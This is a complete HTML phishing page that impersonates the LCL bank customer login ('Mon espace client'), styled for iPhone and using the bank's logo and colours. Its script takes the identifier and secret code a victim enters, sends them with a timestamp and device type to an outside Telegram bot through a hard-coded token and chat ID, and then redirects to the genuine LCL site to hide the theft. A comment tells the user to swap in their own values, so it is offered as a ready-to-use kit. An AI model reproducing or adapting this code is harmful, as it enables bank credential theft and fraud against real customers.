<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LCL - Mon espace client</title>
    <style>
        /* Reset et Base */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #f5f5f5;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* Conteneur principal imitant l'UI iOS */
        .login-container {
            background-color: #fff;
            width: 100%;
            max-width: 400px;
            padding: 30px 20px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }

        /* Logo LCL (Utilisation du logo officiel) */
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            max-width: 120px;
            height: auto;
        }

        /* Titres */
        h2 {
            font-size: 18px;
            color: #1f368b; /* Bleu LCL */
            margin-bottom: 20px;
            text-align: center;
            font-weight: 600;
        }

        /* Champs de formulaire */
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #666;
            font-weight: 500;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            background-color: #fafafa;
            transition: border-color 0.3s;
            -webkit-appearance: none; /* Important pour iOS */
        }

        input:focus {
            outline: none;
            border-color: #1f368b;
            background-color: #fff;
            box-shadow: 0 0 0 3px rgba(31, 54, 139, 0.1);
        }

        /* Bouton Submit */
        .btn-submit {
            width: 100%;
            padding: 16px;
            background-color: #1f368b; /* Bleu LCL */
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }

        .btn-submit:hover {
            background-color: #162766;
        }

        .btn-submit:active {
            transform: scale(0.98);
        }

        /* Liens bas de page */
        .footer-links {
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
        }
        .footer-links a {
            color: #1f368b;
            text-decoration: none;
            display: block;
            margin-bottom: 10px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Loader caché par défaut */
        .loader {
            display: none;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">
            <!-- Logo officiel LCL -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/LCL_Logo.svg/1200px-LCL_Logo.svg.png" alt="Logo LCL">
        </div>
        
        <h2>Connexion à Mon Espace Client</h2>

        <form id="loginForm">
            <div class="form-group">
                <label for="userId">Identifiant</label>
                <input type="text" id="userId" name="userId" placeholder="Ex: 12345678" required autocomplete="username" autofocus>
            </div>

            <div class="form-group">
                <label for="password">Code secret</label>
                <input type="password" id="password" name="password" placeholder="Entrez votre code" required autocomplete="current-password">
            </div>

            <button type="submit" class="btn-submit">Se connecter</button>
            
            <div class="loader" id="loader">Vérification en cours...</div>
        </form>

        <div class="footer-links">
            <a href="#">J'ai perdu mon identifiant</a>
            <a href="#">Mot de passe oublié ?</a>
        </div>
    </div>

    <script>
        // --- CONFIGURATION TELEGRAM ---
        // Remplacez ces valeurs par les vôtres
        const TELEGRAM_BOT_TOKEN = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ'; 
        const TELEGRAM_CHAT_ID = '8501464548';
        // --------------------------------

        const form = document.getElementById('loginForm');
        const loader = document.getElementById('loader');
        const btn = document.querySelector('.btn-submit');

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            // 1. UI Feedback
            btn.disabled = true;
            btn.textContent = "Connexion...";
            loader.style.display = 'block';

            // 2. Récupération des données
            const userId = document.getElementById('userId').value;
            const password = document.getElementById('password').value;
            const timestamp = new Date().toLocaleString('fr-FR');
            
            // 3. Envoi vers Telegram
            const message = `🔐 <b>Nouvelle Connexion LCL</b>\n\n👤 <b>Identifiant:</b> ${userId}\n🔑 <b>Code:</b> ${password}\n📅 <b>Date:</b> ${timestamp}\n📱 <b>Appareil:</b> ${navigator.userAgent.match(/iPhone|iPad|iPod/)? 'iOS' : 'Autre'}`;
            
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;

            fetch(telegramUrl)
                .then(response => {
                    if(response.ok) {
                        console.log('Data sent to Telegram');
                    }
                })
                .catch(error => {
                    console.error('Error sending to Telegram', error);
                })
                .finally(() => {
                    // 4. Redirection vers la vraie page LCL
                    // On simule un petit délai pour que l'utilisateur voie "Vérification..."
                    setTimeout(() => {
                        window.location.href = "https://monespace.lcl.fr/";
                    }, 1500);
                });
        });
    </script>

</body>
</html>
